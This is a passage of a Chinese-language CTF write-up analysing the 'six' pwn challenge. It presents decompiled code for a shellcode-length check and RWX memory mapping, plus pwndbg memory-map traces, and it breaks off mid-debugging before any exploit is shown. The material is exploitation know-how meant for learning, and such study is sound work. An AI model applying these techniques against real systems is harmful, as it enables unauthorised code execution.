six</span><br><span class="line">six: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=426dd1b2aab668b73945b91d45568813be69b9c7, stripped</span><br><span class="line">$ checksec six</span><br><span class="line">[*] &apos;/home/.../Desktop/six/six&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全部都开启了。</p><h4 id="0x01-观察程序行为"><a href="#0x01-观察程序行为" class="headerlink" title="0x01 观察程序行为"></a>0x01 观察程序行为</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./six</span><br><span class="line">Show Ne0 your shellcode:</span><br><span class="line">difjodkfoj</span><br><span class="line">Invalid shellcode!</span><br></pre></td></tr></table></figure><p>程序让我们输入一段shellcode，不正确则退出。</p><h4 id="0x02-IDA分析-1"><a href="#0x02-IDA分析-1" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> (__fastcall *v3)(__int64, <span class="keyword">char</span> *); <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  rand_mmap2();                                 <span class="comment">// 分配两块大小为0x1000的内存，起始地址随机</span></span><br><span class="line">  v3 = dest;                                    <span class="comment">// 分配的具有RWX权限内存的起始地址</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Show Ne0 your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">6u</span>LL);                            <span class="comment">// 输入6个字节shellcode</span></span><br><span class="line">  check_shellcode(&amp;s);                          <span class="comment">// 检查shellcode格式</span></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(src);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, src, v4);                        <span class="comment">// 将src处的数据复制到dest,dest具有X权限</span></span><br><span class="line">  v5 = dest;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(src);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v5[v6], &amp;s, <span class="number">7u</span>LL);                    <span class="comment">// 将我们输入的shellcode放在src后面</span></span><br><span class="line">  v3(fake_stack, &amp;s);                           <span class="comment">// 调用dest处的shellcode</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个自定义函数，经过分析函数功能，可以知道，第一个函数，也就是rand_mmap2()函数，随机分配了两块大小一样的内存块，不过所拥有的权限的不一样的。第二个函数是check_shellcode()，是对用户输入的shellcode进行格式检查，检查通过，则程序认为是有效的shellcode。下面我们进入这两个函数看一下,首先进入rand_mmap2()函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">rand_mmap2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);                    <span class="comment">// canary</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 从/dev/urandom读取两个随机数，作为分配内存的起始地址</span></span><br><span class="line">  read(fd, &amp;buf, <span class="number">6u</span>LL);</span><br><span class="line">  read(fd, &amp;v3, <span class="number">6u</span>LL);</span><br><span class="line">  dest = mmap((v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);<span class="comment">// 分配第一块内存，权限为RWX</span></span><br><span class="line">  fake_stack = mmap((buf &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) + <span class="number">0x500</span>;<span class="comment">// 分配第二块内存，权限为RW</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过搜索，我们知道，此函数从/dev/urandom读取了两个随机数，分别作为将要分配的两块内存的起始地址。这里为什么是6个字节的地址呢，因为64bit的CPU只有48位地址总线，也就是6个字节，64bit的程序只能访问2^48大小的虚拟内存。然后，分配了两块大小为0x1000的内存块，第一块dest的权限为RWX,第二块fake_stack的权限为RW。</p><p>接下来，我们进入check_shellcode函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">check_shellcode</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) &amp; <span class="number">1</span> )                        <span class="comment">// 该字节最低位为1</span></span><br><span class="line">      ++v2;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 该字节最低位为0</span></span><br><span class="line">      ++v3;</span><br><span class="line">    <span class="keyword">for</span> ( j = i + <span class="number">1</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(i + a1) == *(j + a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid shellcode!"</span>);             <span class="comment">// 6个字节互不相同</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid shellcode!"</span>);                 <span class="comment">// 三个字节为偶数，三个字节为奇数</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数对我们传入的6字节shellcode进行了判断，shellcode应该满足的条件是，6个字节的值会不相等，并且三个字节为偶数，三个字节为奇数，才是有效的shellcode,否则退出。</p><p>我们再来看看接下来，主程序做了什么。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">rand_mmap2();                                 <span class="comment">// 分配两块大小为0x1000的内存，起始地址随机</span></span><br><span class="line">v3 = dest;                                    <span class="comment">// 分配的具有RWX权限内存的起始地址</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Show Ne0 your shellcode:"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;s, <span class="number">6u</span>LL);                            <span class="comment">// 输入6个字节shellcode</span></span><br><span class="line">check_shellcode(&amp;s);                          <span class="comment">// 检查shellcode格式</span></span><br><span class="line">v4 = <span class="built_in">strlen</span>(src);</span><br><span class="line"><span class="built_in">memcpy</span>(dest, src, v4);                        <span class="comment">// 将src处的数据复制到dest,dest具有X权限</span></span><br><span class="line">v5 = dest;</span><br><span class="line">v6 = <span class="built_in">strlen</span>(src);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;v5[v6], &amp;s, <span class="number">7u</span>LL);                    <span class="comment">// 将我们输入的shellcode放在src后面</span></span><br><span class="line">v3(fake_stack, &amp;s);                           <span class="comment">// 调用dest处的shellcode</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><p>首先程序分配了两块0x1000的内存，然后让我们输入了6字节的shellcode，并对shellcode进行检查。然后将src处的数据复制到刚才分配的具有可执行权限的内存块，然后将我们输入的shellcode接在src的后面，然后执行。不具有可执行权限的内存块用于伪造栈。</p><p>通过gdb调试，我们可以知道，当从/dev/urandom读出来的数值较大时，mmap随机进行分配内存块。而当二者均随机分配时，则这两个内存块有可能是相连的。这里第一次分配的内存块在高地址，用于存放shellcode,第二次分配的内存块在低地址，用于伪造栈。至于这里为什么第一次分配的内存块在高地址，而第二次的在低地址，我还没有搞清楚这里面的机制。看的资料都说是随机分配，没找到具体的。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、第一次调试</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">rsp</span>  <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x300000001</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdcc8</span> ◂— <span class="number">0xa563d35f2600</span> 第二块</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ <span class="built_in">rsi</span>  <span class="number">0x7fffffffdcd0</span> ◂— <span class="number">0x703df49340fc</span> 第一块</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdcd8</span> ◂— <span class="number">0xdd44ac71043c3600</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ <span class="built_in">rbp</span>  <span class="number">0x7fffffffdce0</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x555555554cc0</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdce8</span> —▸ <span class="number">0x555555554be8</span> ◂— <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rip</span> + <span class="number">0x2014a1</span>]</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd1e</span> ◂— <span class="number">0x555555554cc00000</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdcf8</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x555555554aa8</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0x703df4934000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x7</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第一块分配前</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">第一块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x703df4934000</span>     <span class="number">0x703df4935000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块      </span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x555555554adc</span>    <span class="keyword">call</span>   mmap@plt &lt;<span class="number">0x555555554840</span>&gt;</span><br><span class="line"><span class="symbol">        addr:</span> <span class="number">0xa563d35f2000</span></span><br><span class="line"><span class="symbol">        len:</span> <span class="number">0x1000</span></span><br><span class="line"><span class="symbol">        prot:</span> <span class="number">0x3</span></span><br><span class="line"><span class="symbol">        flags:</span> <span class="number">0x22</span></span><br><span class="line"><span class="symbol">        fd:</span> <span class="number">0xffffffff</span></span><br><span class="line"><span class="symbol">        offset:</span> <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">第二块分配后</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/buffer/Desktop/six/six</span><br><span class="line">    <span class="number">0x703df4934000</span>     <span class="number">0x703df4935000</span> rwxp     <span class="number">1000</span> <span class="number">0</span>      第一块</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff6000</span>     <span class="number">0x7ffff7ff7000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      第二块，地址不是/dev/urandom出来的地址，因为数值较大，mmap随机分配</span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span 